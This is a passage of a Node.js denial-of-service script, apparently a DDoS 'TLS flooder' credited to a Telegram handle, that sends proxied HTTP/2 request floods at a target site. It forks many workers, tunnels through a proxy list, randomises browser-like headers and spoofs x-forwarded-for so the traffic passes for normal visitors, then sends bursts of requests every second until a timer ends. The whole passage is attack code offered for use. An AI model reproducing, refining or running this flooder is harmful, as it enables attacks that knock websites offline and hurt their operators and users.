  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'te;q=0.9,en-US;q=0.8,en;q=0.7',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
];
                    
                                          

dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
 ],
 io_type = [
    "text/plain",
      "text/html",
        "text/html; charset=utf-8",
          "application/json",
            "application/xml",
              "multipart/form-data",
                "application/octet-stream",
                  "image/jpeg",
                    "image/png",
                      "audio/mpeg",
                        "video/mp4",
                          "application/javascript",
                            "application/pdf",
                              "application/vnd.ms-excel",
                                "application/vnd.ms-powerpoint",
                                  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                      "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                        "application/zip",
                                          "image/gif",
                                            "image/bmp",
                                              "image/tiff",
                                                "audio/wav",
                                                  "audio/midi",
                                                    "video/avi",
                                                      "video/mpeg",
                                                        "video/quicktime",
                                                          "text/csv",
                                                            "text/xml",
                                                              "text/css",
                                                                "text/javascript",
                                                                  "application/graphql",
                                                                    "application/x-www-form-urlencoded",
                                                                      "application/vnd.api+json",
                                                                        "application/ld+json",
                                                                          "application/x-pkcs12",
                                                                            "application/x-pkcs7-certificates",
                                                                              "application/x-pkcs7-certreqresp",
                                                                                "application/x-pem-file",
                                                                                  "application/x-x509-ca-cert",
                                                                                    "application/x-x509-user-cert",
                                                                                      "application/x-x509-server-cert",
                                                                                        "application/x-bzip",
                                                                                          "application/x-gzip",
                                                                                            "application/x-7z-compressed",
                                                                                              "application/x-rar-compressed",
                                                                                                "application/x-shockwave-flash"
                                                                                                ];
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
 ],
 content_type = [
    "text/plain",
      "text/html",
        "text/html; charset=utf-8",
          "application/json",
            "application/xml",
              "multipart/form-data",
                "application/octet-stream",
                  "image/jpeg",
                    "image/png",
                      "audio/mpeg",
                        "video/mp4",
                          "application/javascript",
                            "application/pdf",
                              "application/vnd.ms-excel",
                                "application/vnd.ms-powerpoint",
                                  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                      "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                        "application/zip",
                                          "image/gif",
                                            "image/bmp",
                                              "image/tiff",
                                                "audio/wav",
                                                  "audio/midi",
                                                    "video/avi",
                                                      "video/mpeg",
                                                        "video/quicktime",
                                                          "text/csv",
                                                            "text/xml",
                                                              "text/css",
                                                                "text/javascript",
                                                                  "application/graphql",
                                                                    "application/x-www-form-urlencoded",
                                                                      "application/vnd.api+json",
                                                                        "application/ld+json",
                                                                          "application/x-pkcs12",
                                                                            "application/x-pkcs7-certificates",
                                                                              "application/x-pkcs7-certreqresp",
                                                                                "application/x-pem-file",
                                                                                  "application/x-x509-ca-cert",
                                                                                    "application/x-x509-user-cert",
                                                                                      "application/x-x509-server-cert",
                                                                                        "application/x-bzip",
                                                                                          "application/x-gzip",
                                                                                            "application/x-7z-compressed",
                                                                                              "application/x-rar-compressed",
                                                                                                "application/x-shockwave-flash"
                                                                                                ],
 
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
]

var proxies = readLines(args.proxy);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster){
    const dateObj = new Date();
        for (let i = 0; i < process.argv[5]; i++){
            cluster.fork();
            console.clear()
        }
        console.log("Telegram: @ngocphong0311 ( TLS )".rainbow);
        console.log(`\x1b[33mTarget: \x1b[0m${process.argv[2]}`);
        console.log(`\x1b[33mTime: \x1b[0m${process.argv[3]}`);
        console.log(`\x1b[33mRate: \x1b[0m${process.argv[4]}`);
        console.log(`\x1b[33mThread: \x1b[0m${process.argv[5]}`);
        console.log(`\x1b[33mProxyFile: \x1b[0m${process.argv[6]} | \x1b[33mTotal(s): \x1b[0m${proxies.length}`);
        console.log(`--------------------------------------`);

        setTimeout(() => {
        }, process.argv[5] * 1000);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
        }
    } else {setInterval(runFlooder) }

class NetSocket {
     constructor(){}
 
HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
     host: options.host,
     port: options.port,
     allowHalfOpen: true,
     writable: true,
     readable: true
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 10000);
     connection.setNoDelay(true);
     connection.on("connect", () => {
     connection.write(buffer);
     });

     connection.on("data", chunk => {
     const response = chunk.toString("utf-8");
     const isAlive = response.includes("HTTP/1.1 200");
     if (isAlive === false) {
     connection.destroy();
     return callback(undefined, "403");
     }
     return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "403");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "403");
     });
 }}

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
 headers["accept-encoding"] = "gzip,deflate,br";
 headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
 headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
 headers["cookie"] = process.argv[7];
 headers["sec-ch-ua"] = "Chromium";v="108", "Opera GX";v="94", "Not)A;Brand";v="99";
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = "Windows";
 headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
 headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
 headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
 headers["sec-fetch-user"] = "?1";
 headers["content-type"] = content_type[Math.floor(Math.random() * content_type.length)];
 headers["upgrade-insecure-requests"] = "1";
 headers["user-agent"] = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40";
 headers["x-requested-with"] = "XMLHttpRequest";

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     headers[":authority"] = parsedTarget.host
     headers["x-forwarded-for"] = parsedProxy[0];
     headers["x-forwarded-proto"] = "https";
     const proxyOptions = {
     host: parsedProxy[0],
     port: parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 15
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true);

         const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

         const tlsOptions = {
            port: 443,
            ALPNProtocols: [
                "h2"
            ],
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            servername: url.hostname,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: secureProtocol
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
         
         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 1000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });

         client.setMaxListeners(0);
         client.settings(settings);

         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const request = client.request(headers)

                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }

 const KillScript = () => process.exit();
 setTimeout(KillScript, args.time * 1000);